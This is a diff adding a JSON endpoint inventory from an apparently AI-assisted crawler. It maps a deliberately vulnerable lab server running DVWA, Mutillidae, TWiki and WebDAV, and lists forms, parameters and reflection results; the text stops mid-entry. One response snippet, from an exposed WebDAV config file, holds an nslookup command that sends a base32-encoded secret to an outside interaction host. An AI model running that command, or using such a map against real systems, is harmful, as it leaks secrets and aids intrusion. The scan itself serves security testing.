@@ -1,0 +1,4613 @@
+{
+  "target": "https://server.vulnapp.id",
+  "base_url": "https://server.vulnapp.id",
+  "generated_at": "2026-10-02T14:32:35+0000",
+  "endpoints": [
+    {
+      "url": "http://TWiki.org/cgi-bin/edit/TWiki/",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "templatetopic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://TWiki.org/cgi-bin/edit/TWiki/",
+          "method": "GET",
+          "fields": [
+            "topic",
+            "templatetopic"
+          ],
+          "field_types": {
+            "topic": "text",
+            "templatetopic": "hidden"
+          },
+          "hidden_values": {
+            "templatetopic": "ExampleTopicTemplate"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs",
+      "method": "POST",
+      "params": [
+        {
+          "name": "newweb",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "baseweb",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "webbgcolor",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "sitemapwhat",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "sitemapuseto",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosearchall",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "newtopic",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "action",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs",
+          "method": "POST",
+          "fields": [
+            "newweb",
+            "baseweb",
+            "webbgcolor",
+            "sitemapwhat",
+            "sitemapuseto",
+            "nosearchall",
+            "nosearchall",
+            "newtopic",
+            "action"
+          ],
+          "field_types": {
+            "newweb": "text",
+            "baseweb": "text",
+            "webbgcolor": "text",
+            "sitemapwhat": "text",
+            "sitemapuseto": "text",
+            "nosearchall": "radio",
+            "newtopic": "hidden",
+            "action": "hidden"
+          },
+          "hidden_values": {
+            "newtopic": "",
+            "action": "createweb"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://TWiki.org/cgi-bin/passwd/Main/WebHome",
+      "method": "POST",
+      "params": [
+        {
+          "name": "username",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "password",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "passwordA",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "TopicName",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://TWiki.org/cgi-bin/passwd/Main/WebHome",
+          "method": "POST",
+          "fields": [
+            "username",
+            "password",
+            "passwordA",
+            "TopicName"
+          ],
+          "field_types": {
+            "username": "text",
+            "password": "password",
+            "passwordA": "password",
+            "TopicName": "hidden"
+          },
+          "hidden_values": {
+            "TopicName": "ResetPassword"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": true,
+          "likely_login": true
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://TWiki.org/cgi-bin/passwd/TWiki/WebHome",
+      "method": "POST",
+      "params": [
+        {
+          "name": "username",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "oldpassword",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "password",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "passwordA",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "TopicName",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "change",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://TWiki.org/cgi-bin/passwd/TWiki/WebHome",
+          "method": "POST",
+          "fields": [
+            "username",
+            "oldpassword",
+            "password",
+            "passwordA",
+            "TopicName",
+            "change"
+          ],
+          "field_types": {
+            "username": "text",
+            "oldpassword": "password",
+            "password": "password",
+            "passwordA": "password",
+            "TopicName": "hidden",
+            "change": "hidden"
+          },
+          "hidden_values": {
+            "TopicName": "ChangePassword",
+            "change": "on"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": true,
+          "likely_login": true
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins",
+      "method": "GET",
+      "params": [
+        {
+          "name": "sel",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins",
+          "method": "GET",
+          "fields": [
+            "sel",
+            "topic"
+          ],
+          "field_types": {
+            "sel": "text",
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://server.vulnapp.id/twiki/bin/register/Main/WebHome",
+      "method": "POST",
+      "params": [
+        {
+          "name": "Twk1Name",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk1WikiName",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk1LoginName",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk1Email",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk0Phone",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk0Department",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk1Location",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "Twk0Comment",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "TopicName",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "http://server.vulnapp.id/twiki/bin/register/Main/WebHome",
+          "method": "POST",
+          "fields": [
+            "Twk1Name",
+            "Twk1WikiName",
+            "Twk1LoginName",
+            "Twk1Email",
+            "Twk0Phone",
+            "Twk0Department",
+            "Twk1Location",
+            "Twk0Comment",
+            "TopicName"
+          ],
+          "field_types": {
+            "Twk1Name": "text",
+            "Twk1WikiName": "text",
+            "Twk1LoginName": "text",
+            "Twk1Email": "text",
+            "Twk0Phone": "text",
+            "Twk0Department": "text",
+            "Twk1Location": "text",
+            "Twk0Comment": "text",
+            "TopicName": "hidden"
+          },
+          "hidden_values": {
+            "TopicName": "TWikiRegistration"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/TWikiRegistration",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "http://server.vulnapp.id/twiki/bin/search/Main/SearchResult",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "http://server.vulnapp.id/twiki/bin/search/Main/SearchResult",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "http://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "http://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "http://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "http://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<html><head><title>Metasploitable2 - Linux</title></head><body> <pre> _ _ _ _ _ _ ____ _ __ ___ ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \\ | '_ ` _ \\ / _ \\ __/ _` / __| '_ \\| |/ _ \\|",
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/.well-known/security.txt",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id///////Stop",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/api",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api-docs",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/config",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/items",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/products",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/status",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/users",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/v1",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/api/v2",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/dav/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /dav</title> </head> <body> <h1>Index of /dav</h1> <table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th",
+      "notes": "discovered by Katana; AI-directed path: Discovered WebDAV directory listing endpoint."
+    },
+    {
+      "url": "https://server.vulnapp.id/dav/?C=N;O=D",
+      "method": "GET",
+      "params": [
+        {
+          "name": "C",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "N;O=D"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /dav</title> </head> <body> <h1>Index of /dav</h1> <table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/dav/config",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/plain",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "{ \"dns_server\": \"darn9upkqdht1jr7ma10xn8utwtkncbdk.oast.fun\", \"lookup_command\": \"nslookup $(echo 'SECRET_DATA_3Jr8fe9QEDVd0oFj2HrqM4TIOBj' | base32).config.darn9upkqdht1jr7ma10xn8utwtkncbdk.oast.fun\",",
+      "notes": "AI-directed path: Exposed text configuration file under WebDAV."
+    },
+    {
+      "url": "https://server.vulnapp.id/dvwa/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200,
+        302
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<div align=\"center\"> <img src=\"dvwa/images/logo.png\"> <pre>Unable to connect to the database.<br>mysql_error()<br /><br /></pre> Click <a href=\"setup.php\">here</a> to setup the database. </div>",
+      "notes": "discovered by Katana; AI-directed path: Discovered application root path for DVWA."
+    },
+    {
+      "url": "https://server.vulnapp.id/dvwa/dvwa/images/logo.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/dvwa/login.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/dvwa/setup.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> <meta http-equiv=\"Content-Type\" content",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/dvwa/setup.php",
+      "method": "POST",
+      "params": [
+        {
+          "name": "create_db",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/dvwa/setup.php",
+          "method": "POST",
+          "fields": [
+            "create_db"
+          ],
+          "field_types": {
+            "create_db": "submit"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/dvwa/setup.php",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/graphql",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/health",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/icons/back.gif",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/gif",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/icons/blank.gif",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/gif",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/icons/unknown.gif",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/gif",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; AI-directed path: Discovered application root path for Mutillidae."
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/?page=add-to-your-blog.php",
+      "method": "GET",
+      "params": [
+        {
+          "name": "page",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "add-to-your-blog.php"
+          ],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "page"
+      ],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; discovered by Katana; reflection=raw"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/documentation/function.include",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/documentation/function.include-once",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/documentation/includes/back-button.inc",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/documentation/vulnerabilities.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/framer.html",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"> <html> <head> <link rel=\"stylesheet\" type=\"text/css\" href=\"./styles/global-styles.css\" /> <meta h",
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/function.main",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /mutillidae/function.main was not found on this serve",
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/function.mysqli-close",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /mutillidae/function.mysqli-close was not found on th",
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/function.mysqli-mysqli",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /mutillidae/function.mysqli-mysqli was not found on t",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/function.mysqli-query",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /mutillidae/function.mysqli-query was not found on th",
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/IhackBanner2x_final_print.jpg",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/jpeg",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/backtrack-4-r2-logo-90-69.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/bui_eclipse_pos_logo_fc_med.jpg",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/jpeg",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/coykillericon.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/owasp-logo-400-300.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/php-mysql-logo-176-200.jpeg",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/jpeg",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/right.gif",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/gif",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/samurai-wtf-logo-320-214.jpeg",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/jpeg",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
